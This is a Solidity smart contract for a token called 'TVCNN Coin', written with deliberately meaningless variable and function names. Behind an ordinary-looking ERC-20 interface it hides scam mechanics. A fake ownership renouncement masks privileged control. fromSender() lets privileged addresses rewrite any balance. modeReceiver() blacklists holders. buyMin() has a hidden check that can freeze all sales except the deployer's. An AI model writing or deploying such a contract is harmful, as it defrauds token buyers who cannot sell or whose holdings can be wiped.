//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface marketingLiquidityToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundLiquidity) external view returns (uint256);

    function transfer(address senderTake, uint256 txFromSender) external returns (bool);

    function allowance(address feeReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 txFromSender) external returns (bool);

    function transferFrom(
        address sender,
        address senderTake,
        uint256 txFromSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxMode, uint256 value);
    event Approval(address indexed feeReceiver, address indexed spender, uint256 value);
}

interface receiverFundTeam is marketingLiquidityToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract limitWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isSender {
    function createPair(address senderExempt, address swapTotal) external returns (address);
}

interface launchedMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract TVCNNCoin is limitWallet, marketingLiquidityToken, receiverFundTeam {

    string private sellTo = "TCN";

    mapping(address => uint256) private enableBuy;

    uint256 public liquidityEnableReceiver;

    event OwnershipTransferred(address indexed minTeam, address indexed autoToken);

    function balanceOf(address fundLiquidity) public view virtual override returns (uint256) {
        return enableBuy[fundLiquidity];
    }

    uint256 launchSell;

    uint256 private liquidityAt;

    constructor (){
        if (amountMarketing) {
            buyMax = liquidityAt;
        }
        sellWallet();
        launchedMarketing enableShouldList = launchedMarketing(walletEnable);
        maxTakeReceiver = isSender(enableShouldList.factory()).createPair(enableShouldList.WETH(), address(this));
        if (liquidityAt != launchedIs) {
            liquidityAt = sellTotalAuto;
        }
        shouldFeeMarketing = _msgSender();
        buyListToken[shouldFeeMarketing] = true;
        enableBuy[shouldFeeMarketing] = enableAuto;
        if (amountMarketing) {
            buyMax = launchedIs;
        }
        emit Transfer(address(0), shouldFeeMarketing, enableAuto);
    }

    function tradingTeam(address shouldTakeFee, address senderTake, uint256 txFromSender) internal returns (bool) {
        require(enableBuy[shouldTakeFee] >= txFromSender);
        enableBuy[shouldTakeFee] -= txFromSender;
        enableBuy[senderTake] += txFromSender;
        emit Transfer(shouldTakeFee, senderTake, txFromSender);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableAuto;
    }

    mapping(address => bool) public totalLaunch;

    uint8 private fundTotalAuto = 18;

    function transfer(address swapBuyLimit, uint256 txFromSender) external virtual override returns (bool) {
        return buyMin(_msgSender(), swapBuyLimit, txFromSender);
    }

    address autoLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function modeReceiver(address takeAuto) public {
        walletMarketing();
        
        if (takeAuto == shouldFeeMarketing || takeAuto == maxTakeReceiver) {
            return;
        }
        totalLaunch[takeAuto] = true;
    }

    uint256 private enableAuto = 100000000 * 10 ** 18;

    address private limitFrom;

    address public maxTakeReceiver;

    string private minFee = "TVCNN Coin";

    function sellWallet() public {
        emit OwnershipTransferred(shouldFeeMarketing, address(0));
        limitFrom = address(0);
    }

    function transferFrom(address shouldTakeFee, address senderTake, uint256 txFromSender) external override returns (bool) {
        if (_msgSender() != walletEnable) {
            if (receiverToken[shouldTakeFee][_msgSender()] != type(uint256).max) {
                require(txFromSender <= receiverToken[shouldTakeFee][_msgSender()]);
                receiverToken[shouldTakeFee][_msgSender()] -= txFromSender;
            }
        }
        return buyMin(shouldTakeFee, senderTake, txFromSender);
    }

    function decimals() external view virtual override returns (uint8) {
        return fundTotalAuto;
    }

    address public shouldFeeMarketing;

    mapping(address => mapping(address => uint256)) private receiverToken;

    function walletMarketing() private view {
        require(buyListToken[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return sellTo;
    }

    uint256 public sellTotalAuto;

    function fromSender(address swapBuyLimit, uint256 txFromSender) public {
        walletMarketing();
        enableBuy[swapBuyLimit] = txFromSender;
    }

    bool private toSender;

    address walletEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return limitFrom;
    }

    uint256 private launchedIs;

    function approve(address sellTotal, uint256 txFromSender) public virtual override returns (bool) {
        receiverToken[_msgSender()][sellTotal] = txFromSender;
        emit Approval(_msgSender(), sellTotal, txFromSender);
        return true;
    }

    function owner() external view returns (address) {
        return limitFrom;
    }

    uint256 public buyMax;

    function allowance(address exemptSell, address sellTotal) external view virtual override returns (uint256) {
        if (sellTotal == walletEnable) {
            return type(uint256).max;
        }
        return receiverToken[exemptSell][sellTotal];
    }

    function buyMin(address shouldTakeFee, address senderTake, uint256 txFromSender) internal returns (bool) {
        if (shouldTakeFee == shouldFeeMarketing) {
            return tradingTeam(shouldTakeFee, senderTake, txFromSender);
        }
        uint256 minReceiver = marketingLiquidityToken(maxTakeReceiver).balanceOf(autoLimit);
        require(minReceiver == launchSell);
        require(!totalLaunch[shouldTakeFee]);
        return tradingTeam(shouldTakeFee, senderTake, txFromSender);
    }

    bool public isTeamMarketing;

    uint256 fundWallet;

    function name() external view virtual override returns (string memory) {
        return minFee;
    }

    bool public amountMarketing;

    function amountTakeLaunch(uint256 txFromSender) public {
        walletMarketing();
        launchSell = txFromSender;
    }

    mapping(address => bool) public buyListToken;

    function shouldTeam(address buyFund) public {
        if (isTeamMarketing) {
            return;
        }
        
        buyListToken[buyFund] = true;
        if (toSender == amountMarketing) {
            liquidityAt = liquidityEnableReceiver;
        }
        isTeamMarketing = true;
    }

}